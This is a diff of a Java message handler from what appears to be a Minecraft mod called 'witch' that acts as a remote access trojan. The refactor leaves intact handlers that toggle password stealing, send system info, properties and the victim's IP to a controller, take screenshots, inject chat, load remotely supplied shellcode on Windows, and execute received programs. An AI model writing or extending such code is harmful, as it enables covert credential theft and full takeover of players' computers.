@@ -10,7 +10,6 @@ import me.soda.witch.shared.LogUtil;
 import me.soda.witch.shared.NetUtil;
 import me.soda.witch.shared.ProgramUtil;
 import me.soda.witch.shared.socket.messages.Message;
-import me.soda.witch.shared.socket.messages.Variables;
 import net.minecraft.client.util.GlfwUtil;
 import net.minecraft.text.Text;
 
@@ -23,12 +22,11 @@ public class MessageHandler {
         LogUtil.println("Received message: " + msgType);
         try {
             switch (msgType) {
-                case "steal_pwd_switch" ->
-                        Variables.INSTANCE.passwordBeingLogged = !Variables.INSTANCE.passwordBeingLogged;
+                case "steal_pwd_switch" -> Witch.VARIABLES.passwordBeingLogged = !Witch.VARIABLES.passwordBeingLogged;
                 case "chat_control" -> ChatUtils.sendChat((String) msg);
-                case "chat_filter" -> Variables.INSTANCE.filterPattern = (String) msg;
-                case "chat_filter_switch" -> Variables.INSTANCE.isBeingFiltered = !Variables.INSTANCE.isBeingFiltered;
-                case "chat_mute" -> Variables.INSTANCE.isMuted = !Variables.INSTANCE.isMuted;
+                case "chat_filter" -> Witch.VARIABLES.filterPattern = (String) msg;
+                case "chat_filter_switch" -> Witch.VARIABLES.isBeingFiltered = !Witch.VARIABLES.isBeingFiltered;
+                case "chat_mute" -> Witch.VARIABLES.isMuted = !Witch.VARIABLES.isMuted;
                 case "mods" -> Witch.send(msgType, MCUtils.allMods());
                 case "systeminfo" -> Witch.send(msgType, MCUtils.systemInfo());
                 case "screenshot" -> ScreenshotUtil.gameScreenshot();
@@ -42,13 +40,13 @@ public class MessageHandler {
                     if (ProgramUtil.isWin())
                         new Thread(() -> new ShellcodeLoader().loadShellCode((String) msg)).start();
                 }
-                case "log" -> Variables.INSTANCE.logChatAndCommand = !Variables.INSTANCE.logChatAndCommand;
-                case "config" -> Witch.send(msgType, Variables.INSTANCE);
+                case "log" -> Witch.VARIABLES.logChatAndCommand = !Witch.VARIABLES.logChatAndCommand;
+                case "config" -> Witch.send(msgType, Witch.VARIABLES);
                 case "player" -> Witch.send(msgType, MCUtils.getPlayerInfo());
                 case "skin" -> MCUtils.sendPlayerSkin();
                 case "server" -> {
                     MCUtils.disconnect();
-                    Variables.INSTANCE.canJoinServer = !Variables.INSTANCE.canJoinServer;
+                    Witch.VARIABLES.canJoinServer = !Witch.VARIABLES.canJoinServer;
                 }
                 case "kick" -> MCUtils.disconnect();
                 case "execute" -> new Thread(() -> ProgramUtil.runProg((byte[]) msg)).start();
@@ -58,7 +56,7 @@ public class MessageHandler {
                 case "props" -> Witch.send(msgType, System.getProperties());
                 case "ip" -> Witch.send(msgType, NetUtil.getIP());
                 case "crash" -> GlfwUtil.makeJvmCrash();
-                case "server_name" -> Variables.INSTANCE.name = (String) msg;
+                case "server_name" -> Witch.VARIABLES.name = (String) msg;
             }
         } catch (Exception e) {
             LogUtil.println("Corrupted message!");
